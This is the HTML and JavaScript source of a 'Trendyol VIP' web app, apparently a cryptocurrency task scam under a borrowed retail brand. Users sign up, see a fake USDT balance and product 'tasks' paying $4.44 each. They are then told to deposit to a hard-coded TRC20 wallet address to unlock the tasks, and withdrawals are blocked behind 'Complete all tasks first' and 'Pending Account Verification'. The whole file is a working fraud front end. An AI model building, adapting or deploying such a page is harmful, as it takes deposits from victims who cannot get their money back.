<!DOCTYPE html>
<html lang="en" dir="ltr" id="html-tag">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trendyol VIP - Global Partners</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { --primary: #f27a1a; --dark: #111; --gold: #c5a059; --green: #27ae60; --red: #e74c3c; --gray: #f4f7f6; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--gray); margin: 0; padding: 0; }
        .header { background: var(--dark); color: white; padding: 40px 20px; text-align: center; border-bottom: 5px solid var(--primary); position: relative; }
        .lang-btn { position: absolute; top: 15px; right: 15px; background: transparent; color: white; border: 1px solid white; padding: 5px 12px; border-radius: 20px; cursor: pointer; }
        .balance-val { font-size: 38px; font-weight: bold; color: var(--gold); }
        .action-btns { display: flex; gap: 15px; justify-content: center; margin: 20px 0; padding: 0 20px; }
        .btn-act { flex: 1; padding: 12px; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; }
        .section-title { padding: 20px; font-weight: bold; display: flex; justify-content: space-between; }
        .task-list { padding: 0 15px 100px 15px; }
        .task-card { background: white; border-radius: 15px; padding: 15px; margin-bottom: 15px; display: flex; gap: 15px; align-items: center; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .task-img-container { width: 90px; height: 90px; background: #eee; border-radius: 12px; overflow: hidden; display: flex; align-items: center; justify-content: center; border: 1px solid #ddd; }
        .task-img { width: 100%; height: 100%; object-fit: contain; }
        .task-info { flex: 1; }
        .task-name { font-weight: bold; font-size: 14px; color: #222; margin-bottom: 5px; }
        .task-profit { color: var(--green); font-weight: bold; }
        .btn-submit { background: var(--primary); color: white; border: none; padding: 10px 18px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
        .modal-content { background: white; width: 100%; max-width: 400px; border-radius: 25px; padding: 30px; text-align: center; }
        #auth-screen { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .inp { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; box-sizing: border-box; margin-bottom: 10px; }
        .btn-main { width: 100%; padding: 15px; border: none; border-radius: 12px; background: var(--primary); color: white; font-weight: bold; cursor: pointer; }
        [dir="rtl"] { text-align: right; }
        [dir="rtl"] .lang-btn { right: auto; left: 15px; }
    </style>
</head>
<body>

    <div id="auth-screen">
        <div style="width: 100%; max-width: 320px; text-align: center;">
            <h2 style="color: var(--primary);">Trendyol VIP</h2>
            <input type="email" id="email" class="inp" placeholder="Email">
            <input type="password" id="password" class="inp" placeholder="Password">
            <button class="btn-main" onclick="handleAuth('login')">Login</button>
            <button class="btn-main" style="background: #444; margin-top: 10px;" onclick="handleAuth('signup')">Sign Up</button>
        </div>
    </div>

    <div id="main-app" style="display:none;">
        <div class="header">
            <button class="lang-btn" onclick="toggleLang()" id="lang-btn">العربية</button>
            <div id="txt-bal-title">Total Balance (USDT)</div>
            <div class="balance-val">$ <span id="balance">0.00</span></div>
            <div class="action-btns">
                <button class="btn-act" style="background:var(--green);" onclick="openModal('deposit')">Deposit</button>
                <button class="btn-act" style="background:var(--red);" onclick="openModal('withdraw')">Withdraw</button>
            </div>
        </div>
        <div class="section-title"><span id="txt-tasks">Daily Tasks</span><span id="task-count" style="color: var(--primary);">0/10</span></div>
        <div id="tasks-container" class="task-list"></div>
    </div>

    <div id="modal" class="modal">
        <div class="modal-content">
            <h3 id="m-title"></h3>
            <p id="m-desc" style="font-size: 14px; color: #666; line-height: 1.5;"></p>
            <div id="m-extra" style="background:#f9f9f9; padding:15px; border-radius:10px; margin:15px 0; word-break:break-all; font-family:monospace;"></div>
            <button class="btn-main" onclick="closeModal()">Close</button>
        </div>
    </div>

<script>
    const supabaseUrl = 'https://setalptyphrhbjcwmhoq.supabase.co';
    const supabaseKey = 'sb_publishable_P8QbHZQxsaAKYFTpQVU_Gw_1QU5DHas';
    const _supabase = supabase.createClient(supabaseUrl, supabaseKey);

    let currentLang = 'en', userData = {}, currentUser = null;

    // صور جديدة ومضمونة 100% من روابط مباشرة
    const products = [
        { name: "iPhone 15 Pro Max 256GB", price: 1199, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/iphone.png?t=iphone" },
        { name: "Sony Wireless Headphones XM5", price: 348, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/sony.png" },
        { name: "MacBook Air Laptop M2", price: 999, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/mac.png" },
        { name: "Samsung Galaxy S24 Ultra", price: 1299, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/samsung.png" },
        { name: "PlayStation 5 Console Slim", price: 449, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/ps5.png" }
    ];

    async function handleAuth(type) {
        const email = document.getElementById('email').value, password = document.getElementById('password').value;
        const { data, error } = type === 'signup' ? await _supabase.auth.signUp({ email, password }) : await _supabase.auth.signInWithPassword({ email, password });
        if (error) alert(error.message); else if (type === 'login') loadData(data.user); else alert("Success! Now login.");
    }

    async function loadData(user) {
        currentUser = user;
        const { data } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
        if (data) { userData = data; document.getElementById('auth-screen').style.display = 'none'; document.getElementById('main-app').style.display = 'block'; updateUI(); }
        else { setTimeout(() => loadData(user), 2000); }
    }

    function toggleLang() {
        currentLang = currentLang === 'en' ? 'ar' : 'en';
        document.getElementById('html-tag').dir = currentLang === 'ar' ? 'rtl' : 'ltr';
        document.getElementById('lang-btn').innerText = currentLang === 'en' ? 'العربية' : 'English';
        updateUI();
    }

    function updateUI() {
        document.getElementById('balance').innerText = userData.balance.toFixed(2);
        document.getElementById('task-count').innerText = `${userData.tasks_completed}/10`;
        document.getElementById('txt-bal-title').innerText = currentLang === 'en' ? 'Total Balance (USDT)' : 'إجمالي الرصيد (USDT)';
        document.getElementById('txt-tasks').innerText = currentLang === 'en' ? 'Daily Tasks' : 'المهام اليومية';
        
        const container = document.getElementById('tasks-container');
        container.innerHTML = '';
        products.forEach((p) => {
            container.innerHTML += `
                <div class="task-card">
                    <div class="task-img-container"><img src="${p.img}" class="task-img" onerror="this.src='https://via.placeholder.com/100?text=Product'"></div>
                    <div class="task-info"><div class="task-name">${p.name}</div><div class="task-profit">+ $${p.profit}</div></div>
                    <button class="btn-submit" onclick="submitTask()">${currentLang === 'en' ? 'Submit' : 'إرسال'}</button>
                </div>`;
        });
    }

    function submitTask() { if (!userData.is_vip) openModal('deposit'); else alert("Task processed!"); }

    function openModal(type) {
        document.getElementById('modal').style.display = 'flex';
        if (type === 'deposit') {
            document.getElementById('m-title').innerText = currentLang === 'en' ? "VIP Activation" : "تفعيل حساب VIP";
            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Deposit to this TRC20 address to unlock tasks." : "قم بالإيداع في عنوان TRC20 أدناه لفتح المهام.";
            document.getElementById('m-extra').innerText = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
        } else {
            document.getElementById('m-title').innerText = currentLang === 'en' ? "Withdrawal" : "سحب الأرباح";
            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Complete all tasks first." : "أكمل جميع المهام أولاً.";
            document.getElementById('m-extra').innerText = "Status: Pending Account Verification";
        }
    }

    function closeModal() { document.getElementById('modal').style.display = 'none'; }
</script>
</body>
</html>
